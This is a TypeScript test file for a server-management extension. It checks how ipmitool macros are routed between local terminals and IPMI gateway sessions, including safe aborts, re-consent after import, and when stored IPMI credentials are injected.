      terminals: new Map<string, unknown>([["sess-gw", gwTerminal]])
    });
    await setMacros([{ id: "a", name: "Ping", text: "ping ${profile.host}\n", runIn: "localTerminal" }]);
    await pickFirst();

    await runMacroOnServer(ctx, { server: target });

    expect(createdTerminals).toHaveLength(1);
    expect(createdTerminals[0].sent).toEqual(["ping 10.1.2.3\n"]);
    expect(gwSent).toEqual([]);
    expect(connectServer).not.toHaveBeenCalled();
  });

  it("keeps an EXPLICITLY route:local macro on a gateway server local too (the field is not advisory)", async () => {
    const target = server({ id: "srv-1", name: "Target", ipmiHost: "10.0.0.9", ipmiGatewayServerId: "gw-1" });
    const gateway = server({ id: "gw-1", name: "Bastion" });
    const gwSent: string[] = [];
    const gwTerminal = { name: "Nexus SSH: Bastion", sendText: (text: string) => gwSent.push(text) };
    const ctx = routingContext({
      servers: [target, gateway],
      sessions: [{ id: "sess-gw", serverId: "gw-1" }],
      terminals: new Map<string, unknown>([["sess-gw", gwTerminal]])
    });
    await setMacros([{ id: "a", name: "SOL", text: GW_SOL, runIn: "localTerminal", route: "local" }]);
    await pickFirst();

    await runMacroOnServer(ctx, { server: target });

    expect(createdTerminals).toHaveLength(1);
    expect(gwSent).toEqual([]);
  });

  it("FALLS BACK to a local terminal — plus the note — when route:ipmiGateway but the target has no gateway", async () => {
    // Fails BOTH against an impl that refuses the run (createdTerminals would be
    // 0) AND against one that drops the note.
    const target = server({ id: "srv-1", name: "Target", ipmiHost: "10.0.0.9" });
    const ctx = routingContext({ servers: [target] });
    await setMacros([{ id: "a", name: "SOL", text: GW_SOL, runIn: "localTerminal", route: "ipmiGateway" }]);
    await pickFirst();

    await runMacroOnServer(ctx, { server: target });

    expect(createdTerminals).toHaveLength(1);
    expect(createdTerminals[0].sent).toEqual([" ipmitool -H 10.0.0.9 -a sol activate\n"]);
    const status = setStatusBarMessage.mock.calls.map((call) => String(call[0])).join("\n");
    expect(status).toContain("No IPMI gateway is configured for Target — running locally");
  });

  it("applies checked IPMI credentials on the local fallback when no gateway is configured", async () => {
    const target = server({
      id: "srv-1",
      name: "Target",
      ipmiHost: "10.0.0.9",
      ipmiAuthProfileId: "ap-1"
    });
    const ctx = context({
      core: {
        getSnapshot: () => ({ activeSessions: [], servers: [target] }),
        getAuthProfile: (id: string) => id === "ap-1" ? authProfile() : undefined,
        onDidChange: () => () => {}
      },
      secretVault: {
        get: async () => "stored-bmc-password",
        store: async () => {},
        delete: async () => {}
      }
    } as unknown as Partial<CommandContext>);
    await setMacros([
      {
        id: "a",
        name: "SOL",
        text: "ipmitool -H ${profile.ipmiHost} -E sol activate\n",
        runIn: "localTerminal",
        route: "ipmiGateway",
        provideIpmiCredentials: true
      }
    ]);
    await pickFirst();

    await runMacroOnServer(ctx, { server: target });

    expect(createdTerminals).toHaveLength(1);
    expect(createdTerminals[0].env).toEqual({
      IPMITOOL_PASSWORD: "stored-bmc-password",
      IPMI_PASSWORD: "stored-bmc-password"
    });
    expect(createdTerminals[0].sent).toEqual(["ipmitool -H 10.0.0.9 -E sol activate\n"]);
    const status = setStatusBarMessage.mock.calls.map((call) => String(call[0])).join("\n");
    expect(status).toContain("No IPMI gateway is configured for Target — running locally");
    expect(status).not.toContain(IPMI_GATEWAY_INERT_CREDENTIALS_HINT);
  });

  /**
   * SAFETY (Codex P1) — a target that NAMES a gateway which is now unavailable
   * (addressless after an inventory downgrade, or deleted so the id dangles) must
   * ABORT, never fall back to a local terminal. Falling back injects the target's
   * IPMI credentials into a LOCAL shell; for `ipmitool power off` an overlapping
   * private address reachable locally can hit a DIFFERENT device. Distinct from a
   * target with NO gateway configured (below), where local IS the configured route.
   *
   *  ⊘ collapse unavailable→local (today's resolver) — fires a local terminal, no
   *    abort error → these fail
   *  ⊘ abort when NO gateway configured — the "no gateway ⇒ run locally" case
   *    below would abort → that case fails
   */
  it("ABORTS — no local terminal, nothing sent — when route:ipmiGateway but the configured gateway is ADDRESSLESS", async () => {
    const target = server({ id: "srv-1", name: "Target", ipmiHost: "10.0.0.9", ipmiGatewayServerId: "gw-1" });
    const gateway = server({ id: "gw-1", name: "stopped-gw", host: "", addressless: true });
    const ctx = routingContext({ servers: [target, gateway] });
    await setMacros([{ id: "a", name: "SOL", text: GW_SOL, runIn: "localTerminal", route: "ipmiGateway" }]);
    await pickFirst();

    await runMacroOnServer(ctx, { server: target });

    // Nothing ran anywhere — no local terminal (the unsafe fall-back), no session send.
    expect(createdTerminals).toHaveLength(0);
    // The user is told why, in an error — not a silent local fall-back with a note.
    const err = showErrorMessage.mock.calls.map((call) => String(call[0])).join("\n");
    expect(err).toContain("unavailable");
    expect(err).toContain("Target");
    // The old "running locally" fall-back note must NOT appear — that path is gone.
    const status = setStatusBarMessage.mock.calls.map((call) => String(call[0])).join("\n");
    expect(status).not.toContain("running locally");
  });

  it("ABORTS — no session opened, nothing sent — when route:ipmiGateway but the configured gateway is a TELNET profile (⊘ routing into it sends the gateway macro into that device's telnet console, not an SSH gateway)", async () => {
    const target = server({ id: "srv-1", name: "Target", ipmiHost: "10.0.0.9", ipmiGatewayServerId: "gw-1" });
    // Has a host (so NOT addressless), but speaks telnet — no SSH console.
    const gateway = server({ id: "gw-1", name: "telnet-box", host: "10.9.9.9", protocol: "telnet" });
    const gwSent: string[] = [];
    const gwTerminal = { name: "Nexus Telnet: telnet-box", show: () => {}, sendText: (text: string) => gwSent.push(text) };
    const ctx = routingContext({
      servers: [target, gateway],
      // A pre-seeded session so a buggy "route anyway" impl would visibly reuse it.
      sessions: [{ id: "sess-gw", serverId: "gw-1" }],
      terminals: new Map<string, unknown>([["sess-gw", gwTerminal]])
    });
    await setMacros([{ id: "a", name: "SOL", text: GW_SOL, runIn: "localTerminal", route: "ipmiGateway" }]);
    await pickFirst();

    await runMacroOnServer(ctx, { server: target });

    // Nothing ran anywhere — not into the telnet session, not into a local terminal.
    expect(gwSent).toEqual([]);
    expect(createdTerminals).toHaveLength(0);
    expect(connectServer).not.toHaveBeenCalled();
    const err = showErrorMessage.mock.calls.map((call) => String(call[0])).join("\n");
    expect(err).toContain("unavailable");
    expect(err).toContain("Telnet");
  });

  it("ABORTS — no local terminal — when route:ipmiGateway but the gateway id is dangling/deleted (names no server)", async () => {
    const target = server({ id: "srv-1", name: "Target", ipmiHost: "10.0.0.9", ipmiGatewayServerId: "ghost" });
    const ctx = routingContext({ servers: [target] });
    await setMacros([{ id: "a", name: "SOL", text: GW_SOL, runIn: "localTerminal", route: "ipmiGateway" }]);
    await pickFirst();

    await runMacroOnServer(ctx, { server: target });

    expect(createdTerminals).toHaveLength(0);
    const err = showErrorMessage.mock.calls.map((call) => String(call[0])).join("\n");
    expect(err).toContain("unavailable");
    const status = setStatusBarMessage.mock.calls.map((call) => String(call[0])).join("\n");
    expect(status).not.toContain("running locally");
  });

  it("treats an untrusted route ('IPMIGATEWAY') as local, on a gateway server", async () => {
    // The dispatch half of the untrusted-route unit test: a direct `===` read
    // would route this onto the bastion; the resolver reads it as local.
    const target = server({ id: "srv-1", name: "Target", ipmiHost: "10.0.0.9", ipmiGatewayServerId: "gw-1" });
    const gateway = server({ id: "gw-1", name: "Bastion" });
    const gwSent: string[] = [];
    const gwTerminal = { name: "Nexus SSH: Bastion", sendText: (text: string) => gwSent.push(text) };
    const ctx = routingContext({
      servers: [target, gateway],
      sessions: [{ id: "sess-gw", serverId: "gw-1" }],
      terminals: new Map<string, unknown>([["sess-gw", gwTerminal]])
    });
    await setMacros([
      { id: "a", name: "SOL", text: GW_SOL, runIn: "localTerminal", route: "IPMIGATEWAY" as TerminalMacro["route"] }
    ]);
    await pickFirst();

    await runMacroOnServer(ctx, { server: target });

    expect(createdTerminals).toHaveLength(1);
    expect(gwSent).toEqual([]);
  });

  it("emits the route re-consent note for a LOCAL-routed IPMI macro on a gateway server, and still runs locally", async () => {
    const target = server({ id: "srv-1", name: "Target", ipmiHost: "10.0.0.9", ipmiGatewayServerId: "gw-1" });
    const gateway = server({ id: "gw-1", name: "Bastion" });
    const ctx = routingContext({ servers: [target, gateway] });
    // Local-routed (no route), text uses ${profile.ipmiHost}.
    await setMacros([{ id: "a", name: "SOL", text: " ipmitool -H ${profile.ipmiHost} sol activate\n", runIn: "localTerminal" }]);
    await pickFirst();

    await runMacroOnServer(ctx, { server: target });

    expect(createdTerminals).toHaveLength(1);
    const status = setStatusBarMessage.mock.calls.map((call) => String(call[0])).join("\n");
    expect(status).toContain("set 'Run on: the server's IPMI gateway'");
    expect(status).toContain("Bastion");
  });

  /**
   * Issue #151 — a RESTORED "IPMI SOL console (via jump host)". Import strips
   * `route` (and it never had `provideIpmiCredentials`), so it runs its `-a`
   * command on this machine. The one remedy that works is "Run on → the server's
   * IPMI gateway"; ticking "Provide IPMI credentials" changes nothing for `-a`
   * (ipmitool prompts, it never reads the environment), so that hint must not be
   * shown at all — not merely shown second.
   *
   *  ⊘ today's ordering (credentials hint whenever the flag is off) — the status
   *    carries "tick Provide IPMI credentials" → fails
   *  ⊘ silence the credentials hint AND the reconsent note together — the status
   *    loses "Run on" → fails
   */
  it("#151 — a restored jump-host macro is pointed at 'Run on', never at the credentials checkbox", async () => {
    const template = MACRO_TEMPLATES.find((entry) => entry.id === "ipmi-sol-gateway")!.macro;
    const incoming = collectIncomingMacros({
      version: 2 as const,
      exportedAt: "",
      macros: [{ id: "m", ...template } as TerminalMacro]
    });
    const restored = incoming!.macros[0];
    // The premise: the restore really did strip the route, and the text still says -a.
    expect("route" in restored).toBe(false);
    expect(restored.text).toContain(" -a ");

    // The shipped text uses ${profile.ipmiUsername}, so the target links an IPMI
    // auth profile — without one the run is refused before any note is built.
    const target = server({
      id: "srv-1",
      name: "Target",
      ipmiHost: "10.0.0.9",
      ipmiAuthProfileId: "ap-1",
      ipmiGatewayServerId: "gw-1"
    });
    const gateway = server({ id: "gw-1", name: "Bastion" });
    await setMacros([restored]);
    await pickFirst();

    await runMacroOnServer(routingContext({ servers: [target, gateway], authProfiles: [authProfile()] }), {
      server: target
    });

    expect(createdTerminals).toHaveLength(1);
    const status = setStatusBarMessage.mock.calls.map((call) => String(call[0])).join("\n");
    expect(status).toContain("set 'Run on: the server's IPMI gateway'");
    expect(status).toContain("Bastion");
    expect(status).not.toContain("Provide IPMI credentials");
    expect(status).not.toContain("IPMI credentials were not provided");
  });

  it("#151 — a local `-E` macro with the flag off on the SAME gateway server still gets the credentials hint", async () => {
    // The sibling the fix must not over-reach into: for `-E` the checkbox IS the
    // remedy (ipmitool reads the env it fills), and a gateway being configured
    // does not change that. ⊘ "suppress the credentials hint whenever the
    // reconsent note fires" (keyed on the route, not the command) → fails here.
    const target = server({ id: "srv-1", name: "Target", ipmiHost: "10.0.0.9", ipmiGatewayServerId: "gw-1" });
    const gateway = server({ id: "gw-1", name: "Bastion" });
    await setMacros([
      { id: "a", name: "SOL", text: " ipmitool -H ${profile.ipmiHost} -E sol activate\n", runIn: "localTerminal" }
    ]);
    await pickFirst();

    await runMacroOnServer(routingContext({ servers: [target, gateway] }), { server: target });

    const status = setStatusBarMessage.mock.calls.map((call) => String(call[0])).join("\n");
    expect(status).toContain('tick "Provide IPMI credentials"');
    expect(status).toContain("set 'Run on: the server's IPMI gateway'");
  });

  it("#151 — the shipped jump-host macro falling back to local (no gateway set) is not told to tick the credentials checkbox either", async () => {
    // The same wrong remedy on the fall-back path: the `-a` command prompts on
    // this machine, so the fall-back note is the whole story.
    const target = server({ id: "srv-1", name: "Target", ipmiHost: "10.0.0.9" });
    await setMacros([{ id: "a", name: "SOL", text: GW_SOL, runIn: "localTerminal", route: "ipmiGateway" }]);
    await pickFirst();

    await runMacroOnServer(routingContext({ servers: [target] }), { server: target });

    const status = setStatusBarMessage.mock.calls.map((call) => String(call[0])).join("\n");
    expect(status).toContain("No IPMI gateway is configured for Target — running locally");
    expect(status).not.toContain("Provide IPMI credentials");
  });

  it("does NOT emit the re-consent note for a local macro with NO IPMI token on the same gateway server", async () => {
    // The scoping sibling: keyed on IPMI-token usage, not on the server's gateway
    // alone — otherwise it would nag on every unrelated local helper.
    const target = server({ id: "srv-1", name: "Target", host: "10.1.2.3", ipmiGatewayServerId: "gw-1" });
    const gateway = server({ id: "gw-1", name: "Bastion" });
    const ctx = routingContext({ servers: [target, gateway] });
    await setMacros([{ id: "a", name: "Ping", text: "ping ${profile.host}\n", runIn: "localTerminal" }]);
    await pickFirst();

    await runMacroOnServer(ctx, { server: target });

    const status = setStatusBarMessage.mock.calls.map((call) => String(call[0])).join("\n");
    expect(status).not.toContain("Run on:");
  });

  it("B1 — does NOT emit the re-consent note for a SESSION macro with an IPMI token on a gateway server (keeps the session hint)", async () => {
    // The re-consent note is scoped to localTerminal macros; a session macro
    // with `${profile.ipmiHost}` on a gateway server used to get BOTH it (false +
    // self-contradictory) and the session hint. Only the session hint is correct.
    const target = server({ id: "srv-1", name: "Target", ipmiHost: "10.0.0.9", ipmiGatewayServerId: "gw-1" });
    const gateway = server({ id: "gw-1", name: "Bastion" });
    const sent: string[] = [];
    const sessTerminal = { name: "Nexus SSH: Target", sendText: (t: string) => sent.push(t) };
    const ctx = routingContext({
      servers: [target, gateway],
      sessions: [{ id: "sess-t", serverId: "srv-1" }],
      terminals: new Map<string, unknown>([["sess-t", sessTerminal]])
    });
    await setMacros([{ id: "a", name: "SOL", text: " ipmitool -H ${profile.ipmiHost} sol activate\n", runIn: "session" }]);
    await pickFirst();

    await runMacroOnServer(ctx, { server: target });

    const status = setStatusBarMessage.mock.calls.map((call) => String(call[0])).join("\n");
    // The false, contradictory re-consent copy is gone...
    expect(status).not.toContain("This macro runs on this machine");
    expect(status).not.toContain("set 'Run on:");
    // ...but the existing (correct) session hint is unchanged.
    expect(status).toContain("ran in the SSH session on the remote host");
  });

  it("B1 — does NOT emit the re-consent note for a BROWSER macro with an IPMI token on a gateway server", async () => {
    // A browser macro has no "Run on" field for the note to point at, so pointing
    // there is a dead end; the note must not fire on this target either.
    const target = server({ id: "srv-1", name: "Target", ipmiHost: "10.0.0.9", ipmiGatewayServerId: "gw-1" });
    const gateway = server({ id: "gw-1", name: "Bastion" });
    const ctx = routingContext({ servers: [target, gateway] });
    await setMacros([{ id: "a", name: "Web", text: "https://${profile.ipmiHost}/", runIn: "browser" }]);
    await pickFirst();

    await runMacroOnServer(ctx, { server: target });

    expect(openExternal).toHaveBeenCalled();
    const status = setStatusBarMessage.mock.calls.map((call) => String(call[0])).join("\n");
    expect(status).not.toContain("This macro runs on this machine");
    expect(status).not.toContain("set 'Run on:");
  });

  it("B2 — reveals the gateway session terminal on delivery of a route:ipmiGateway macro", async () => {
    const target = server({ id: "srv-1", name: "Target", ipmiHost: "10.0.0.9", ipmiGatewayServerId: "gw-1" });
    const gateway = server({ id: "gw-1", name: "Bastion" });
    const show = vi.fn();
    const gwTerminal = { name: "Nexus SSH: Bastion", show, sendText: () => {} };
    const ctx = routingContext({
      servers: [target, gateway],
      sessions: [{ id: "sess-gw", serverId: "gw-1" }],
      terminals: new Map<string, unknown>([["sess-gw", gwTerminal]])
    });
    await setMacros([{ id: "a", name: "SOL", text: GW_SOL, runIn: "localTerminal", route: "ipmiGateway" }]);
    await pickFirst();

    await runMacroOnServer(ctx, { server: target });

    // The interactive `-a` prompt sits hidden until the terminal is focused.
    expect(show).toHaveBeenCalled();
  });

  it("S2 — names the routing context in the connect-first modal on the gateway path", async () => {
    const target = server({ id: "srv-1", name: "Core Switch", ipmiHost: "10.0.0.9", ipmiGatewayServerId: "gw-1" });
    const gateway = server({ id: "gw-1", name: "Bastion" });
    // No gateway session yet → the connect-first modal is shown.
    const ctx = routingContext({ servers: [target, gateway] });
    showWarningMessage.mockResolvedValue(undefined); // decline — the message is what we assert
    await setMacros([{ id: "a", name: "SOL", text: GW_SOL, runIn: "localTerminal", route: "ipmiGateway" }]);
    await pickFirst();

    await runMacroOnServer(ctx, { server: target });

    const msg = String(showWarningMessage.mock.calls[0][0]);
    expect(msg).toContain('"Bastion" (IPMI gateway for "Core Switch")');
  });

  it("P4 — a server naming ITSELF as its IPMI gateway is treated as no gateway (local fall-back + note)", async () => {
    // A hand-edited/exported self-reference must not deliver into the target's own
    // session; it resolves to no gateway, so the run falls back to a local terminal.
    const target = server({ id: "srv-1", name: "Target", ipmiHost: "10.0.0.9", ipmiGatewayServerId: "srv-1" });
    const ctx = routingContext({ servers: [target] });
    await setMacros([{ id: "a", name: "SOL", text: GW_SOL, runIn: "localTerminal", route: "ipmiGateway" }]);
    await pickFirst();

    await runMacroOnServer(ctx, { server: target });

    expect(createdTerminals).toHaveLength(1);
    const status = setStatusBarMessage.mock.calls.map((call) => String(call[0])).join("\n");
    expect(status).toContain("No IPMI gateway is configured for Target — running locally");
  });

  /**
   * Issue #48 PR-C — the behavioral half of the share-export gateway remap
   * (roadmap §4.3, rev11), the two-field interaction end to end:
   *
   *  1. A share bundle is produced with `sanitizeForSharing`, which remaps A's
   *     `ipmiGatewayServerId` to B's NEW id (the data assertion lives in
   *     configImportExport.test.ts). The exported ids are the ones this test then
   *     routes against, so a remap that dangled would surface here as a fall-back.
   *  2. The macro imports LOCAL-ROUTED — `stripImportedCapabilityFields` deletes
   *     `route` on every ingest path — so before the user re-consents it runs on
   *     THIS machine, never on the imported bastion.
   *  3. The user re-ticks "Run on: the server's IPMI gateway" (modelled by setting
   *     `route` back locally), and only THEN does gateway delivery happen, against
   *     the imported A/B pair.
   *
   * THE RE-CONSENT STEP IS THE PROPERTY UNDER TEST — do not optimise it away. A
   * reviewer who deletes it (or exempts `route` from the strip to "make it work")
   * has re-created the unconsented-bastion-execution hole the strip exists to
   * close. Steps 2 and 3 are asserted as opposites so neither can pass vacuously.
   */
  it("imports local-routed (runs locally), then delivers to the imported gateway ONLY after the user re-consents to routing", async () => {
    const originalTarget = server({ id: "A", name: "Target", ipmiHost: "10.0.0.9", ipmiGatewayServerId: "B" });
    const originalGateway = server({ id: "B", name: "Bastion", ipmiHost: "10.9.9.9" });
    const originalMacro: TerminalMacro = {
      id: "m", name: "SOL", text: GW_SOL, runIn: "localTerminal", route: "ipmiGateway"
    };

    // Export → the bundle carries A' and B' with remapped ids, A'.gateway === B'.id.
    const bundle = sanitizeForSharing([originalTarget, originalGateway], [], [], [], {}, [], [originalMacro]);
    const importedTarget = bundle.servers.find((s) => s.name === "Target")!;
    const importedGateway = bundle.servers.find((s) => s.name === "Bastion")!;
    expect(importedTarget.ipmiGatewayServerId).toBe(importedGateway.id);
    // Import strips the route — the imported macro is local by construction.
    const importedMacro = stripImportedCapabilityFields(bundle.macros[0]);
    expect("route" in importedMacro).toBe(false);

    const gwSent: string[] = [];
    const gwTerminal = { name: "Nexus SSH: Bastion", sendText: (text: string) => gwSent.push(text) };
    const ctx = routingContext({
      servers: [importedTarget, importedGateway],
      sessions: [{ id: "sess-gw", serverId: importedGateway.id }],
      terminals: new Map<string, unknown>([["sess-gw", gwTerminal]])
    });

    // BEFORE re-consent: local-routed → a local terminal, gateway untouched.
    await setMacros([importedMacro]);
    await pickFirst();
    await runMacroOnServer(ctx, { server: importedTarget });
    expect(createdTerminals).toHaveLength(1);
    expect(gwSent).toEqual([]);

    // AFTER re-consent: the user re-ticks "Run on", and NOW it rides the imported
    // gateway's session — proving A'.ipmiGatewayServerId resolves to imported B'.
    createdTerminals.length = 0;
    await setMacros([{ ...importedMacro, route: "ipmiGateway" }]);
    await pickFirst();
    await runMacroOnServer(ctx, { server: importedTarget });
    expect(gwSent).toEqual([" ipmitool -H 10.0.0.9 -a sol activate\n"]);
    expect(createdTerminals).toHaveLength(0);
  });

  it("does not read the terminal environment for a gateway-routed macro even when provideIpmiCredentials is on (the flag is inert)", async () => {
    // The credential must never be typed into a remote shell: the gateway path
    // skips the vault/prompt entirely, and the inert-combination note is surfaced.
    const target = server({ id: "srv-1", name: "Target", ipmiHost: "10.0.0.9", ipmiAuthProfileId: "ap-1", ipmiGatewayServerId: "gw-1" });
    const gateway = server({ id: "gw-1", name: "Bastion" });
    const gwSent: string[] = [];
    const gwTerminal = { name: "Nexus SSH: Bastion", sendText: (text: string) => gwSent.push(text) };
    openTerminals = [gwTerminal] as typeof openTerminals;
    const ctx = context({
      core: {
        getSnapshot: () => ({ activeSessions: [{ id: "sess-gw", serverId: "gw-1" }], servers: [target, gateway] }),
        getAuthProfile: (id: string) => (id === "ap-1" ? authProfile() : undefined),
        onDidChange: () => () => {}
      },
      sessionTerminals: new Map<string, unknown>([["sess-gw", gwTerminal]]),
      secretVault: { get: async () => "s3cr3t", store: async () => {}, delete: async () => {} }
    } as unknown as Partial<CommandContext>);
    await setMacros([
      { id: "a", name: "SOL", text: GW_SOL, runIn: "localTerminal", route: "ipmiGateway", provideIpmiCredentials: true }
    ]);
    await pickFirst();

    await runMacroOnServer(ctx, { server: target });

    // Delivered to the gateway, no local terminal, and no credential prompt.
    expect(gwSent).toEqual([" ipmitool -H 10.0.0.9 -a sol activate\n"]);
    expect(createdTerminals).toHaveLength(0);
    expect(showInputBox).not.toHaveBeenCalled();
    const status = setStatusBarMessage.mock.calls.map((call) => String(call[0])).join("\n");
    // The one gateway note (#174, #189): what happens on the gateway, not a guess
    // about which form this command uses.
    expect(status).toContain(IPMI_GATEWAY_INERT_CREDENTIALS_HINT);
    expect(status).not.toContain("will fail");
  });

  it("leaves a LOCAL (non-routed) `-E` macro unchanged — env injected as today, no gateway note", async () => {
    // Regression: the gateway note must not leak into the local path, where the
    // credential IS legitimately injected into the environment of a local terminal.
    const target = server({ id: "srv-1", name: "Target", ipmiHost: "10.0.0.9", ipmiAuthProfileId: "ap-1" });
    const ctx = context({
      core: {
        getSnapshot: () => ({ activeSessions: [], servers: [target] }),
        getAuthProfile: (id: string) => (id === "ap-1" ? authProfile() : undefined),
        onDidChange: () => () => {}
      },
      secretVault: { get: async () => "s3cr3t-bmc", store: async () => {}, delete: async () => {} }
    } as unknown as Partial<CommandContext>);
    await setMacros([
      { id: "a", name: "SOL", text: " ipmitool -H ${profile.ipmiHost} -E sol activate\n", runIn: "localTerminal", provideIpmiCredentials: true }
    ]);
    await pickFirst();

    await runMacroOnServer(ctx, { server: target });

    // A local terminal is created WITH the injected IPMI env (unchanged behaviour).
    expect(createdTerminals).toHaveLength(1);
    expect("env" in createdTerminals[0].options).toBe(true);
    const status = setStatusBarMessage.mock.calls.map((call) => String(call[0])).join("\n");
    expect(status).not.toContain(IPMI_GATEWAY_INERT_CREDENTIALS_HINT);
    expect(status).not.toContain("reads the IPMI password from the environment");
  });

  /**
   * Issues #174 and #189 — the gateway note depends only on what Nexus knows: the
   * effective route and the "Provide IPMI credentials" flag. Gateway command
   * behavior is separate: `-E` without a password variable reports that it could
   * not read the environment, and may prompt only if authentication remains
   * enabled and no other password is supplied (upstream `lib/ipmi_main.c`). The
   * same Nexus note is used for each command below so it makes no command-specific
   * promise.
   */
  describe("one gateway note, from the route and the flag alone (#174, #189)", () => {
    const NOTE_TAIL = "may prompt in the gateway terminal";
    const COMMANDS = [
      " ipmitool -H ${profile.ipmiHost} -E sol activate\n",
      " ipmitool -H ${profile.ipmiHost} -a sol activate\n",
      " ipmitool -I lanplus -H ${profile.ipmiHost} -U admin sol activate\n",
      // Already has its password: `-E` does not make it ask (Codex on #191).
      " ipmitool -H ${profile.ipmiHost} -E -f /etc/bmc.pass sol activate\n",
      // The shapes review found the parse misreading on #191:
      ' ipmitool -H ${profile.ipmiHost} -U "ops;admin" -E sol activate\n', // a quoted separator
      ' n=ipmi; "$n"tool -H ${profile.ipmiHost} -E sol activate\n', // a dynamic command word
      " bash -c 'ipmitool -H ${profile.ipmiHost} -\"E\" sol activate'\n", // a nested shell
      " /opt/bin/my-ipmitool-wrapper -H ${profile.ipmiHost} -E sol activate\n", // a wrapper's name (#174)
      ' ipmitool -H ${profile.ipmiHost} -a sol activate; echo "next time use ipmitool -E"\n' // a mention (#174)
    ];

    async function runOnGateway(text: string, provideIpmiCredentials: boolean): Promise<{ status: string; gwSent: string[] }> {
      setStatusBarMessage.mockClear();
      const target = server({ id: "srv-1", name: "Target", ipmiHost: "10.0.0.9", ipmiGatewayServerId: "gw-1" });
      const gateway = server({ id: "gw-1", name: "Bastion" });
      const gwSent: string[] = [];
      const gwTerminal = { name: "Nexus SSH: Bastion", sendText: (sent: string) => gwSent.push(sent) };
      const ctx = routingContext({
        servers: [target, gateway],
        sessions: [{ id: "sess-gw", serverId: "gw-1" }],
        terminals: new Map<string, unknown>([["sess-gw", gwTerminal]])
      });
      await setMacros([{ id: "a", name: "BMC", text, runIn: "localTerminal", route: "ipmiGateway", provideIpmiCredentials }]);
      await pickFirst();
      await runMacroOnServer(ctx, { server: target });
      return { status: setStatusBarMessage.mock.calls.map((call) => String(call[0])).join("\n"), gwSent };
    }

    it("gives every gateway-routed command the SAME note when the box is ticked — ⊘ choosing the note by parsing the command", async () => {
      const statuses: string[] = [];
      for (const text of COMMANDS) {
        const { status, gwSent } = await runOnGateway(text, true);
        expect(gwSent, text).toHaveLength(1);
        expect(status, text).toContain(IPMI_GATEWAY_INERT_CREDENTIALS_HINT);
        statuses.push(status);
      }
      // One status line for all of them: nothing about the command changes it.
      expect(new Set(statuses).size).toBe(1);
    });

    it("gives no gateway note when the box is unticked, whatever the command — ⊘ keying a note on the command instead of the flag", async () => {
      for (const text of COMMANDS) {
        const { status, gwSent } = await runOnGateway(text, false);
        expect(gwSent, text).toHaveLength(1);
        expect(status, text).not.toContain("gateway session");
        expect(status, text).not.toContain(NOTE_TAIL);
      }
    });

    it("never says `-E` will fail, nor which form the command uses — ⊘ the old warning and assurance (#189)", async () => {
      for (const text of COMMANDS) {
        for (const provideIpmiCredentials of [true, false]) {
          const { status } = await runOnGateway(text, provideIpmiCredentials);
          expect(status, text).not.toMatch(/will fail|fail on/);
          expect(status, text).not.toContain("reads the IPMI password from the environment");
          expect(status, text).not.toContain("via its `-a` form");
          expect(status, text).not.toContain("use ipmitool's -a form");
          // No unconditional prompt: `-E -P …` / `-E -f …` already has its password.
          expect(status, text).not.toContain("asks for the password in the gateway terminal");
        }
      }
    });

    it("states only what is guaranteed, with the prompt conditional — ⊘ the old `-a`-only promise, ⊘ an unconditional prompt", () => {
      // The one string the run note and the editor hint share. What ipmitool uses on
      // the gateway comes first; the prompt applies only when none of it is there
      // (#189: `-E` with no variable prompts too; Codex on #191: `-E -P …` does not).
      expect(IPMI_GATEWAY_INERT_CREDENTIALS_HINT).toContain("uses only what the command or the gateway supplies");
      expect(IPMI_GATEWAY_INERT_CREDENTIALS_HINT).toContain("`-P`, `-f`, or IPMITOOL_PASSWORD/IPMI_PASSWORD set on the gateway");
      expect(IPMI_GATEWAY_INERT_CREDENTIALS_HINT).toContain(
        "when authentication is enabled and no password is supplied, `-a` or `-E` " + NOTE_TAIL
      );
      expect(IPMI_GATEWAY_INERT_CREDENTIALS_HINT).not.toContain("asks for the password in the gateway terminal");
      expect(IPMI_GATEWAY_INERT_CREDENTIALS_HINT).not.toMatch(/fail/i);
    });

    it("does not promise a password prompt when authentication is disabled with `-A NONE`", () => {
      expect(IPMI_GATEWAY_INERT_CREDENTIALS_HINT).not.toContain("makes it ask in the gateway terminal");
      expect(IPMI_GATEWAY_INERT_CREDENTIALS_HINT).toContain("when authentication is enabled");
    });
  });
});
